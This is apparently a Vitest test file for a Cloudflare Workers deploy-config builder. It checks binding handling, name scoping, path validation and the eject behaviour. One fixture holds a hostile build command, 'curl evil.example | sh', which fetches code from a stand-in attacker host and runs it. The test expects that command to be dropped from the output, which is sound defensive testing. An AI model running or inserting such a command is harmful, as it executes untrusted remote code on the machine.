import { describe, expect, it } from "vitest";
import { buildDeployConfig, ejectConfig, scopedName } from "./deploy-config";

const wrangler = (config: Record<string, unknown>) => new Map([["wrangler.json", JSON.stringify({ name: "todo", compatibility_date: "2026-10-01", ...config })]]);

describe("buildDeployConfig", () => {
	it("keeps bindings, drops developer IDs and scopes resource names to the Worker", () => {
		const result = buildDeployConfig(
			wrangler({
				main: "src/index.ts",
				account_id: "0123456789abcdef0123456789abcdef",
				build: { command: "curl evil.example | sh" },
				routes: ["example.com/*"],
				vars: { APP_NAME: "Todo" },
				kv_namespaces: [{ binding: "CACHE", id: "abc", preview_id: "def" }],
				d1_databases: [{ binding: "DB", database_name: "todo-db", database_id: "123", migrations_dir: "./db/migrations" }],
				r2_buckets: [{ binding: "FILES", bucket_name: "todo-files" }],
				queues: { producers: [{ binding: "JOBS", queue: "jobs" }], consumers: [{ queue: "jobs" }] },
			}),
			"my-todo",
		);
		if (!result.ok) throw new Error(result.reason);
		const { config, d1Migrations, assetsDir } = result.deploy;
		expect(config).toEqual({
			name: "my-todo",
			workers_dev: true,
			compatibility_date: "2026-10-01",
			vars: { APP_NAME: "Todo" },
			kv_namespaces: [{ binding: "CACHE" }],
			d1_databases: [{ binding: "DB", database_name: "my-todo-todo-db", migrations_dir: "migrations/DB" }],
			r2_buckets: [{ binding: "FILES", bucket_name: "my-todo-todo-files" }],
			queues: { producers: [{ binding: "JOBS", queue: "my-todo-jobs" }], consumers: [{ queue: "my-todo-jobs" }] },
			main: "out/index.js",
			no_bundle: true,
			observability: { enabled: true },
			find_additional_modules: true,
			base_dir: "out",
		});
		expect(d1Migrations).toEqual([{ binding: "DB", dir: "db/migrations" }]);
		expect(assetsDir).toBeNull();
	});

	it("turns Workers Logs on unless the app configures observability (#40)", () => {
		const on = buildDeployConfig(new Map([["wrangler.json", JSON.stringify({ name: "x", main: "src/index.ts", compatibility_date: "2026-01-01" })]]), "w");
		expect(on.ok && on.deploy.config.observability).toEqual({ enabled: true });
		const own = buildDeployConfig(new Map([["wrangler.json", JSON.stringify({ name: "x", main: "src/index.ts", compatibility_date: "2026-01-01", observability: { enabled: false } })]]), "w");
		expect(own.ok && own.deploy.config.observability).toEqual({ enabled: false });
	});

	it("maps static assets to the copied directory", () => {
		const result = buildDeployConfig(wrangler({ assets: { directory: "./public", not_found_handling: "single-page-application" } }), "site");
		if (!result.ok) throw new Error(result.reason);
		expect(result.deploy.assetsDir).toBe("public");
		expect(result.deploy.config.assets).toEqual({ directory: "assets", not_found_handling: "single-page-application" });
		expect(result.deploy.config.main).toBeUndefined();
	});

	it("rejects paths outside the repo and unsupported bindings", () => {
		expect(buildDeployConfig(wrangler({ assets: { directory: "../etc" } }), "x")).toMatchObject({ ok: false });
		expect(buildDeployConfig(wrangler({ main: "a.ts", d1_databases: [{ binding: "DB", database_name: "d", migrations_dir: "/abs" }] }), "x")).toMatchObject({ ok: false });
		expect(buildDeployConfig(wrangler({ main: "a.ts", containers: [{ class_name: "C", image: "./Dockerfile" }] }), "x")).toEqual({ ok: false, reason: "One-click deploy does not support Containers yet." });
		expect(buildDeployConfig(new Map(), "x")).toMatchObject({ ok: false });
	});
});

describe("scopedName", () => {
	it("stays within 63 lowercase characters", () => {
		expect(scopedName("App", "My_DB")).toBe("app-my-db");
		expect(scopedName("a".repeat(60), "bucket").length).toBeLessThanOrEqual(63);
	});
});

describe("ejectConfig (#41)", () => {
	it("keeps the deployed names but points at the repo's own sources", () => {
		const files = new Map([
			[
				"wrangler.jsonc",
				`{ "name": "todo", "main": "src/worker.ts", "compatibility_date": "2026-01-01",
				   "assets": { "directory": "./public" },
				   "d1_databases": [{ "binding": "DB", "database_name": "todo-db", "database_id": "dev-id", "migrations_dir": "db/migrations" }] }`,
			],
		]);
		const r = ejectConfig(files, "todo-buyer");
		expect(r.ok).toBe(true);
		if (!r.ok) return;
		expect(r.config).toMatchObject({ name: "todo-buyer", main: "src/worker.ts", assets: { directory: "public" }, observability: { enabled: true } });
		expect(r.config.d1_databases).toEqual([{ binding: "DB", database_name: "todo-buyer-todo-db", migrations_dir: "db/migrations" }]);
		expect(r.config).not.toHaveProperty("no_bundle");
		expect(r.config).not.toHaveProperty("base_dir");
		expect(r.d1Bindings).toEqual(["DB"]);
	});
});
